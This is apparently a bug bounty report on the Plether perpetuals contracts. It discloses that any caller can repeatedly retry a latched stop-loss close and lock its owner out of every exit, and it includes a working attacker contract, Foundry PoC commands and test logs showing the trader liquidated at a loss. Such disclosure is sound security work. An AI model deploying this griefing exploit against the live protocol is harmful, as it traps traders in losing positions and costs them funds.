# \#99282 [SC-High] Lack of access control in retryPositionProtectionClose leads to griefing: any caller locks a latched stop-loss owner out of amending its limits or closing

**Submitted on Nov 12th 2026 at 21:22:02 UTC by @deltabear for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99282
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

When a stop-loss close fails on the trader's own loss ceiling, the protection goes `Latched`. The MED-9 fix says only the owner can then raise that ceiling, with an amend that needs `Latched` and no live order. But anyone can call `retryPositionProtectionClose`. Each retry queues a fresh close with the old ceiling and puts the protection back to `Triggered`. An attacker with no position, no role and no USDG executes the doomed attempt and retries it in one transaction, every second. Every owner action reverts: amend, cancel, replace, cancel-and-close, its own retry, an ordinary close and a full-balance withdrawal. The trader is stuck in the losing position while the price keeps moving. In my PoC the trader is liquidated 93 minutes after the stop fired and ends with 869.244786 USDG less than the same trader with no attacker.

## Vulnerability Details

All paths are under `packages/perps/src` at `a82d4fef`.

1. The stop fires and the close fails. Every protection close copies the trader's retained ceilings into its bounds (`router/OrderLiquidationBatchLogic.sol:663-677`). The evaluator enforces `maxGrossAccountDebitAssets` on closes (`CfdOrderPolicyEvaluatorBase.sol:504-508`), and gross debit includes the realized price loss (`CfdOrderPolicyEvaluatorBase.sol:410-411`). In a fast move the loss is above the ceiling and the attempt ends `ConstraintViolation`.
2. The failed attempt relatches. The Router calls `handleFailedProtectionAttempt` (`OrderRouter.sol:324-328`), which sets `Latched` when the position is unchanged (`PositionProtectionBook.sol:664-667`).
3. The owner's only recovery is `amendLatchedPositionProtectionCloseLimits`. It needs `status == Latched` (`PositionProtectionBook.sol:320-322`) and `pendingOrderCounts(owner) == 0` (`PositionProtectionBook.sol:323-325`).
4. Anyone can undo both conditions. `retryPositionProtectionClose` loads the protection with `_activeProtection`, with no owner check (`PositionProtectionBook.sol:385`). The amend uses `_ownedActiveProtection`, which reverts `OrderRouter__Unauthorized` for anyone but the owner (`PositionProtectionBook.sol:319`, `:983-990`). The retry needs only `Latched`, the same position and zero pending orders (`PositionProtectionBook.sol:386-394`).
5. The retry queues a new attempt through `commitProtectionCloseAttempt` (`OrderRouter.sol:123-130`, `router/OrderLiquidationBatchLogic.sol:186-211`) with a zero bounty (`router/OrderLiquidationBatchLogic.sol:673`). That raises `pendingOrderCounts[account]` to 1 (`router/OrderCommitHandler.sol:56`), and the Book sets `Triggered` (`PositionProtectionBook.sol:573`).
6. While that attempt is live, the owner has no exit. Amend reverts `ProtectionNotLatched`. Cancel and replace accept only `PendingOpen` or `Armed` (`PositionProtectionBook.sol:414-419`, `:272-277`). Cancel-and-close needs `Armed` (`PositionProtectionBook.sol:346-348`). An ordinary close hits the trade lock (`router/OrderLiquidationBatchLogic.sol:313-315`).
7. The attacker's next transaction executes that attempt (it fails on the same ceiling and relatches) and retries again. The owner sees `Triggered` with a live child after every attacker transaction.

The guard that should stop this is the owner check that the amend has and the retry does not.

### Vulnerable source code

**1. The owner's amend needs `Latched` and no pending order** @ packages/perps/src/PositionProtectionBook.sol:319
```solidity
        StoredProtection storage protection = _ownedActiveProtection(protectionId, msg.sender);
        if (protection.status != PositionProtectionTypes.PositionProtectionStatus.Latched) {
            revert OrderRouter__ProtectionNotLatched();
        }
        if (IPositionProtectionRouterHost(ROUTER).pendingOrderCounts(msg.sender) != 0) {
            revert OrderRouter__PendingOrdersExist();
        }
```

**2. Any caller can retry, there is no owner check** @ packages/perps/src/PositionProtectionBook.sol:382
```solidity
    function retryPositionProtectionClose(
        uint64 protectionId
    ) external nonReentrant returns (uint64 linkedOrderId) {
        StoredProtection storage protection = _activeProtection(protectionId);
        if (protection.status != PositionProtectionTypes.PositionProtectionStatus.Latched) {
            revert OrderRouter__ProtectionNotLatched();
        }
```

**3. Each retry puts the protection back to `Triggered`** @ packages/perps/src/PositionProtectionBook.sol:572
```solidity
        protection.linkedOrderId = linkedOrderId;
        protection.status = PositionProtectionTypes.PositionProtectionStatus.Triggered;
```

**4. Each failed attempt relatches, so the loop never ends** @ packages/perps/src/PositionProtectionBook.sol:664
```solidity
        retained = _positionMatches(protection);
        emit PositionProtectionCloseAttemptFailed(protectionId, account, orderId, reason, retained);
        if (retained) {
            protection.status = PositionProtectionTypes.PositionProtectionStatus.Latched;
            return true;
        }
```

**5. Cancel accepts only `PendingOpen` or `Armed`** @ packages/perps/src/PositionProtectionBook.sol:414
```solidity
        if (
            status != PositionProtectionTypes.PositionProtectionStatus.PendingOpen
                && status != PositionProtectionTypes.PositionProtectionStatus.Armed
        ) {
            revert OrderRouter__ProtectionNotArmed();
        }
```

**6. The trade lock blocks an ordinary close** @ packages/perps/src/router/OrderLiquidationBatchLogic.sol:313
```solidity
        if (enforceProtectionLock && host.positionProtectionBook().activePositionProtectionId(account) != 0) {
            revert OrderRouter__ProtectionActive();
        }
```

**7. Every retry carries the old ceiling and a zero bounty** @ packages/perps/src/router/OrderLiquidationBatchLogic.sol:673
```solidity
        request.bounds.maxExecutionBountyAssets = 0;
        request.bounds.maxExecutionNotionalAssets = limits.maxExecutionNotionalAssets;
        request.bounds.maxGrossAccountDebitAssets = limits.maxGrossAccountDebitAssets;
```

## Impact Details

- "Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)". The trader withdraws 2,749.749208 USDG after the attack and 3,618.993994 USDG in the control, so the attack costs the trader 869.244786 USDG. After every attacker transaction all 7 owner recovery calls revert, and 60 of 60 amends sent between attacker transactions revert.
- Attacker prerequisites, all permissionless: one contract that calls `OrderRouter.executeOrder` and `PositionProtectionBook.retryPositionProtectionClose`. No position, no role, no USDG, no LP shares. Retries pay no bounty (`router/OrderLiquidationBatchLogic.sol:673`). One cycle costs 1,733,454 gas (forge gas report).
- The victim is an ordinary trader with a max-loss ceiling on its stop-loss, which is what MED-9's fix gives traders. A fast move through the stop is the exact case MED-9's comment names: "Tight limits may prevent execution until conditions improve or the owner amends them."
- Persistence: the lock holds every second the attacker's transaction lands first. On Arbitrum One the Timeboost express lane gives that ordering. To get out, the owner has to land a batch of `executeOrder` plus amend ahead of the attacker in some second (test 7).
- Dedup: MED-9 in the Cecuro report is marked ACKNOWLEDGED. Its root cause was keeper retries that ignored the trader's limits. This report is about the fix: its owner-only amend can be blocked by any caller. The program's rule: "For findings marked as fixed or Acknowledged in the reports above, a report on the same root cause is valid only if it shows that the fix at commit a82d4fefb02768e5b3bddcc97dee371eee24fea8 is incomplete or introduces a new bug." SECURITY.md:1356-1359 lists unpaid retries and the liveness of a `Latched` protection with no live child. It does not cover a third party's retry blocking the owner.

## References

Book:
- packages/perps/src/PositionProtectionBook.sol:315-328 - `amendLatchedPositionProtectionCloseLimits`
- packages/perps/src/PositionProtectionBook.sol:382-406 - `retryPositionProtectionClose`
- packages/perps/src/PositionProtectionBook.sol:572-573 - status set to `Triggered`
- packages/perps/src/PositionProtectionBook.sol:664-667 - relatch on failed attempt
- packages/perps/src/PositionProtectionBook.sol:272-277 - replace needs `PendingOpen` or `Armed`
- packages/perps/src/PositionProtectionBook.sol:346-348 - cancel-and-close needs `Armed`
- packages/perps/src/PositionProtectionBook.sol:414-419 - cancel needs `PendingOpen` or `Armed`
- packages/perps/src/PositionProtectionBook.sol:983-990 - `_ownedActiveProtection` owner check

Router:
- packages/perps/src/OrderRouter.sol:123-130 - `commitProtectionCloseAttempt`
- packages/perps/src/OrderRouter.sol:324-328 - `handleFailedProtectionAttempt` call
- packages/perps/src/router/OrderLiquidationBatchLogic.sol:186-211 - retry close attempt commit
- packages/perps/src/router/OrderLiquidationBatchLogic.sol:313-315 - `ProtectionActive` trade lock
- packages/perps/src/router/OrderLiquidationBatchLogic.sol:663-677 - retained ceilings copied, zero bounty
- packages/perps/src/router/OrderCommitHandler.sol:56 - `pendingOrderCounts` increment

Policy:
- packages/perps/src/CfdOrderPolicyEvaluatorBase.sol:410-411 - gross debit includes price loss
- packages/perps/src/CfdOrderPolicyEvaluatorBase.sol:504-508 - gross debit ceiling enforced

Docs and audits:
- packages/perps/SECURITY.md:547-560 - triggering is irreversible, retry is permissionless
- packages/perps/SECURITY.md:1356-1359 - unpaid retries, `Latched` liveness
- audits/plether-ai-audit-report-2026-10-26.pdf, MED-9 - owner-only amend of retained ceilings



## Link to Proof of Concept

https://gist.github.com/decies-centena-millia/b08b7df4f15454d4a57f92c59be69ea4

## Proof of Concept

## Proof of Concept

The PoC runs in the repo's own Foundry suite at `a82d4fef` on the release stack from `script/DeployPerpsArbitrumSepolia.s.sol`, with `chainid` 42161 and the `DEPLOYMENT.md` parameters asserted in `setUp`. Only out-of-scope parts are stand-ins: the release's MockUSDG, the repo's MockPyth at the release Pyth address (six real feed ids, exponents, confidence, publish times) and the ArbSys precompile.

It shows that after every attacker transaction every owner exit reverts (test 2), and that the stuck trader is liquidated and ends 869.244786 USDG worse than the control (test 4).

```bash
forge test --offline --match-path test/poc/ProtectionRetryBlocksLatchedAmend.t.sol --match-test "test_1|test_2|test_4" --gas-limit 9000000000000000000 $(cat forge-skip-flags.txt) -vv
```

### attack step-by-step

1. Victim opens 250,000 USDG LONG USD with 2,500 USDG margin through `OrderRouter.commitOrder`. It arms a stop at 1.00300 with `PositionProtectionBook.createPositionProtection`, and sets `maxGrossAccountDebitAssets` to 120% of `CfdClosePreview.previewClose` at the stop: 946.965878 USDG.
2. 13:30:01 UTC, US CPI print: the basket gaps 1.00240 to 1.00460. A keeper calls `triggerPositionProtection`, which queues attempt 2.
3. 13:30:02: the attacker contract calls `OrderRouter.executeOrder(2, pyth)`. The attempt fails with `GrossAccountDebit` 1,223.481768 > 946.965878 and relatches. In the same transaction it calls `PositionProtectionBook.retryPositionProtectionClose(protectionId)`, which queues attempt 3, `Triggered`.
4. Every second after that, the same transaction runs on the newest attempt.
5. The victim's amend, cancel, replace, cancel-and-close, retry, `commitOrder` close and full-balance `withdrawMargin` all revert.
6. The USD keeps falling. At t+5,570 s a keeper liquidates the position.

```
plant : the victim's stop-loss close fails on its own ceiling and relatches (CPI gap)
fire  : ProtectionRetryLooper.cycle -> executeOrder(attempt) + retryPositionProtectionClose(protectionId), once per second
```

## main Attack code

### full poc code, single file, single runnable command

Full PoC files and raw logs (secret gist): https://gist.github.com/decies-centena-millia/b08b7df4f15454d4a57f92c59be69ea4

- `ProtectionRetryBlocksLatchedAmend.t.sol` (sha256 `d38ce89827eb1d985d413354f3f8bf9f2ab74dd29beec2226dae51dea69a5bc7`) goes in `test/poc/`. At 65,446 bytes it is too large for this field, so it is in the gist.
- `ProtectionRetryOwnerSelfExecute.t.sol` (tests 6 and 7) is in the gist as well.
- Tools: forge 1.8.5 (`51a52c59cffd940f76eddd0b4bb1791aa4b5ac7f`) and solc 0.8.35, set by the repo's unmodified `foundry.toml` (via-IR). The program names Forge 1.5.1; nothing in the PoC depends on forge-version behaviour.
- Code: the competition repo `immunefi-team/audit-comp-plether` at `a82d4fefb02768e5b3bddcc97dee371eee24fea8`, with submodules at their pins. Upstream `Plether-Fi/plether-core` master `6909f261` has a 0-line diff on `packages/perps/src` (same tree `fff196b1`), so the bug is on master unchanged.

```bash
git clone --recurse-submodules https://github.com/immunefi-team/audit-comp-plether.git
cd audit-comp-plether && git checkout --detach a82d4fefb02768e5b3bddcc97dee371eee24fea8 && git submodule update --init --recursive
mkdir -p test/poc && cp ProtectionRetryBlocksLatchedAmend.t.sol test/poc/
forge test --offline --match-path test/poc/ProtectionRetryBlocksLatchedAmend.t.sol --match-test "test_1|test_2|test_4" --gas-limit 9000000000000000000 $(cat forge-skip-flags.txt) -vv
```

`--gas-limit` raises forge's per-test cap (2^30), because 93 minutes of attacker transactions run inside one test function.

forge-skip-flags.txt (skips unrelated spot, options and fork files so the build is faster):
```text
--skip test/fork/ --skip test/integration/ --skip ArbitrumSepoliaReleaseDefaults --skip DeploySpotArbitrumSepolia --skip LpEpochKeeper --skip PerpsReleaseDeploymentSize --skip VerifyPerpsArbitrumSepolia --skip ContinueFull --skip CreateMorpho --skip DeployFull --skip DeployInvarCoin --skip DeployReward --skip DeploySpotStaking --skip DeployToAnvil --skip DeployToMainnet --skip DeployToSepolia --skip DeployToTest --skip PoolDashboard --skip RedeployOracles --skip SimulateDistribution --skip VerifyDeployment --skip MockTwocrypto --skip MockYieldAdapter
```

The attacker contract, `ProtectionRetryBlocksLatchedAmend.t.sol` lines 309-332 (the rest of the contract is the 61 s expiry variant):
```solidity
contract ProtectionRetryLooper {

    IRouterV3 internal immutable ROUTER;
    IPositionProtectionActions internal immutable BOOK;
    address internal immutable OWNER;

    constructor(
        address router,
        address book
    ) {
        ROUTER = IRouterV3(router);
        BOOK = IPositionProtectionActions(book);
        OWNER = msg.sender;
    }

    function cycle(
        uint64 protectionId,
        bytes[] calldata pythUpdateData
    ) external payable returns (uint64 executedAttemptId, uint64 freshAttemptId) {
        require(msg.sender == OWNER, "owner");
        executedAttemptId = IPositionProtectionViews(address(BOOK)).getPositionProtection(protectionId).linkedOrderId;
        ROUTER.executeOrder{value: msg.value}(executedAttemptId, pythUpdateData);
        freshAttemptId = BOOK.retryPositionProtectionClose(protectionId);
    }
```

### Output

tests-1-2-4.vv.log lines 298 and 431-500: test 2, attacker cycle 1, then every owner recovery call at 13:30:05:
```text
[PASS] test_2_attack_everyOwnerRecoveryPathReverts() (gas: 171015364)
  === ATTACK cycle 1, 13:30:02: attacker executes the CPI attempt and retries in the same tx
    RAW SYSTEM EVENTS [attacker cycle 1 (one transaction)] count=7
      #0 PositionProtectionBook PositionProtectionCloseAttemptFailed
        topic0 0x2d4628b1418b7f72e696de399e03b5a4f62809f74d4303d3576d973abb993fb1
        topic1 0x0000000000000000000000000000000000000000000000000000000000000001
        topic2 0x00000000000000000000000000000000000000000000000000000000007a11ce
        topic3 0x0000000000000000000000000000000000000000000000000000000000000002
        data 0x00000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000001
        decoded PositionProtectionCloseAttemptFailed: attempt 2 reason ConstraintViolation relatched true
      #1 OrderLifecycleBook OrderFinalized
        topic0 0xbc222cbec31354fa718658f6ac96c4f666d34aaf42c0ba8b824d285081930b9f
        topic1 0x0000000000000000000000000000000000000000000000000000000000000002
        topic2 0x00000000000000000000000000000000000000000000000000000000007a11ce
        topic3 0x504c45544845522106393943f03ac61ded45c34748b14ad7da330741745c4024
        data 0xab66b5e95f2a469ad304d3bb4f11e6ed718948da08545a91c23b0981dceab345000000000000000000000000000000000000000000000000000000001c9d1948000000000000000000000000000000000000000000000000000000006af31c5a000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000007a11ce504c45544845522106393943f03ac61ded45c34748b14ad7da330741745c402470c6205aaac97516b8040d13eb254f982f1dfaa3ca40a3f3543c5849455c5b180000000000000000000000000000000000000000000000000000000000000000c584840515b56c03e27eacd5d9971b08fc3bc4d60973c2130fa1561d0a0545780000000000000000000000000000000000000000000000000000000000000003000000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000010000000000000000000000001d70bd962135733e18f143d675951c3caac5046600000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000005fd1b1a0000000000000000000000000000000000000000000000000000000005fd0cd80000000000000000000000000000000000000000000000000000048c2b117e90000000000000000000000000000000000000000000000000000000006af31c5a00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001b7598b3000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000030000000000000000000000000000000000000000000000000000000048ecd9a80000000000000000000000000000000000000000000000000000000038718d768d0e1a2fb344b535704bbfcb1885350e0a70a3155330283c07df44ff72c2f4700000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000120504e870000000000000000000000000000000000000000000000000000000120504e87000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000034f086f3b33b68400000000000000000000000000000000000000000000000000000000000007c6cc2c100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006af31c59000000000000000000000000000000000000000000000000000000000000003c000000000000000000000000000000000000000000000000000000006af31c59000000000000000000000000000000000000000000000000000000006af31c95
        decoded OrderFinalized.receipt: orderId 2 status Failed reason ConstraintViolation failure.constraint GrossAccountDebit failure.actual 1223.481768 failure.limit 946.965878
        decoded OrderFinalized.receipt: executionPrice 100473626 oraclePublishTime 1794317402 executor AttackerLooper economics.grossAccountDebit 0.000000 economics.realizedPnl 0
      #2 OrderLifecycleBook IntentRegistered
        topic0 0x9e0a84bebf3b3afbb106e34a9dc57e51209c08755eedc36619f40efae55c7318
        topic1 0x0000000000000000000000000000000000000000000000000000000000000003
        topic2 0x00000000000000000000000000000000000000000000000000000000007a11ce
        topic3 0x504c455448455221b8c366325691727fae1fe0efec076c53850578f0c21aa2ab
        data 0xa75d122e465b0681f3d61b071cf924c1ae9e5205842273d0566ec120076348170000000000000000000000000000000000000000000000000000000000000000504c455448455221b8c366325691727fae1fe0efec076c53850578f0c21aa2ab00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000034f086f3b33b684000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000bebc2000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000006af31c5a000000000000000000000000000000000000000000000000000000000000003c000000000000000000000000000000000000000000000000000000000000000700000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff0000000000000000000000000000000000000000000000000000000038718d76ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000ffffffff000000000000000000000000000000000000000000000000000000006af31c5a000000000000000000000000000000000000000000000000000000000000003c000000000000000000000000000000000000000000000000000000006af31c5a000000000000000000000000000000000000000000000000000000006af31c96
      #3 OrderLifecycleBook ProtectionAttemptRegistered
        topic0 0xf7c2e27fb0004c08cb5906d32b17f541e5b32c2f22e99b64ba4ec47895e537a5
        topic1 0x0000000000000000000000000000000000000000000000000000000000000003
        data 0x
      #4 MarginClearinghouse (event, see topic0)
        topic0 0x7e5b3bb981ceb7a9fbca1bd66c85fa135040fd39c415653868432ce9b7b4fc4f
        topic1 0x0000000000000000000000000000000000000000000000000000000000000000
        topic2 0x0000000000000000000000000000000000000000000000000000000000000003
        topic3 0x00000000000000000000000000000000000000000000000000000000007a11ce
        data 0x0000000000000000000000000000000000000000000000000000000000000000
      #5 OrderRouter (event, see topic0)
        topic0 0xce686808e249e3a26ffb96791abb06dc0b310d0c74541a6c9274b9ddeadabd5a
        topic1 0x0000000000000000000000000000000000000000000000000000000000000003
        topic2 0x00000000000000000000000000000000000000000000000000000000007a11ce
        data 0x0000000000000000000000000000000000000000000000000000000000000000
      #6 PositionProtectionBook PositionProtectionCloseAttemptQueued
        topic0 0x416409d1de700f455ab9ffdc3a8d24cdbfaadd1e9ba3559f6fe04252a70a0628
        topic1 0x0000000000000000000000000000000000000000000000000000000000000001
        topic2 0x00000000000000000000000000000000000000000000000000000000007a11ce
        topic3 0x0000000000000000000000000000000000000000000000000000000000000003
        data 0x0000000000000000000000000000000000000000000000000000000000000002
        decoded PositionProtectionCloseAttemptQueued: new attempt 3 previous 2
    SYSTEM [after attacker cycle 1]
      protection.status Triggered  linkedOrderId 3
      router.pendingOrderCounts(victim) 1
      retained maxGrossAccountDebitAssets 946.965878
      engine.positions(victim).size 250000000000000000000000  engine.lastMarkPrice 100469976
  === OWNER recovery attempts at 13:30:05 (the control owner amended successfully at this second)
    SYSTEM [state the owner sees at 13:30:05]
      protection.status Triggered  linkedOrderId 6
      router.pendingOrderCounts(victim) 1
      retained maxGrossAccountDebitAssets 946.965878
      engine.positions(victim).size 250000000000000000000000  engine.lastMarkPrice 100471611
    SYSTEM owner amendLatchedPositionProtectionCloseLimits: success=false
           raw revert data 0x5b54e624 = OrderRouter__ProtectionNotLatched()
    SYSTEM owner cancelPositionProtection: success=false
           raw revert data 0x2dee7d8f = OrderRouter__ProtectionNotArmed()
    SYSTEM owner cancelPositionProtectionAndCommitClose: success=false
           raw revert data 0x2dee7d8f = OrderRouter__ProtectionNotArmed()
    SYSTEM owner replacePositionProtection: success=false
           raw revert data 0x2dee7d8f = OrderRouter__ProtectionNotArmed()
    SYSTEM owner retryPositionProtectionClose (owner): success=false
           raw revert data 0x5b54e624 = OrderRouter__ProtectionNotLatched()
    SYSTEM owner router.commitOrder (ordinary full close): success=false
           raw revert data 0x3a0535a3 = OrderRouter__ProtectionActive()
    SYSTEM owner clearinghouse.withdrawMargin (full balance): success=false
           raw revert data 0xdc4fe3f0 = MarginClearinghouse__InsufficientBalance()
```

tests-1-2-4.vv.log lines 3245-3250: test 2, after 64 attacker cycles:
```text
    SYSTEM attacker cycles 5..64 done; owner amend attempts between them that reverted: 60
    SYSTEM [after 64 attacker cycles]
      protection.status Triggered  linkedOrderId 66
      router.pendingOrderCounts(victim) 1
      retained maxGrossAccountDebitAssets 946.965878
      engine.positions(victim).size 250000000000000000000000  engine.lastMarkPrice 100501415
```

tests-1-2-4.vv.log lines 3252 and 3329-3361: test 4, control vs attack, liquidation and wallets:
```text
[PASS] test_4_attack_trappedPositionIsLiquidated() (gas: 9860669915)
  === CONTROL (no attacker)
    SYSTEM 13:30:02 keeper executes the CPI attempt: ExecutionResult{orderId 2, status Failed, terminalReason ConstraintViolation, pendingReason 0}
    SYSTEM [control: after the failed attempt]
      protection.status Latched  linkedOrderId 2
      router.pendingOrderCounts(victim) 0
      retained maxGrossAccountDebitAssets 946.965878
      engine.positions(victim).size 250000000000000000000000  engine.lastMarkPrice 100469976
    SYSTEM owner amendLatchedPositionProtectionCloseLimits: succeeded (did not revert)
    SYSTEM keeper executes the owner's amended retry: ExecutionResult{orderId 3, status Executed, terminalReason Executed, pendingReason 0}
    SYSTEM [after the amended retry filled]
      protection.status Executed  linkedOrderId 3
      router.pendingOrderCounts(victim) 0
      retained maxGrossAccountDebitAssets 2500.000000
      engine.positions(victim).size 0  engine.lastMarkPrice 100470815
  === ATTACK: one attacker tx per second; the post-CPI USD selloff extends to 1.00960 over 3h
      t+0s | Triggered | child 3 | pending 1 | size 250000000000000000000000 | balance 4837.101191 | locked 2337.501191 | freeBuyingPower 2499.600000 | mark 100470815 | owner calls reverted 7/7
      t+1800s | Triggered | child 1803 | pending 1 | size 250000000000000000000000 | balance 4837.101191 | locked 2337.501191 | freeBuyingPower 2499.600000 | mark 100553615 | owner calls reverted 7/7
      t+3600s | Triggered | child 3603 | pending 1 | size 250000000000000000000000 | balance 4837.101191 | locked 2337.501191 | freeBuyingPower 2499.600000 | mark 100641008 | owner calls reverted 7/7
      t+5400s | Triggered | child 5403 | pending 1 | size 250000000000000000000000 | balance 4837.101191 | locked 2337.501191 | freeBuyingPower 2499.600000 | mark 100726932 | owner calls reverted 7/7
    SYSTEM keeper liquidation succeeded at t+ (s) / basket 5570 100733824
    SYSTEM engine.positions(victim).size after           0
    SYSTEM [after liquidation]
      protection.status Liquidated  linkedOrderId 5573
      router.pendingOrderCounts(victim) 0
      retained maxGrossAccountDebitAssets 946.965878
      engine.positions(victim).size 0  engine.lastMarkPrice 100733653
  === RESULT (all values SYSTEM-read)
    control victim USDG wallet after withdraw (exit 13:30:06) 3618.993994
    attack  victim USDG wallet after withdraw (liquidated)    2749.749208

Suite result: ok. 3 passed; 0 failed; 0 skipped; finished in 151.84s (151.96s CPU time)

Ran 1 test suite in 151.86s (151.84s CPU time): 3 tests passed, 0 failed, 0 skipped (3 total tests)
```

The trader ends with 2,749.749208 USDG after the attack and 3,618.993994 USDG in the control, 869.244786 USDG lost to the lock. The attacker contract holds no USDG and pays only gas.

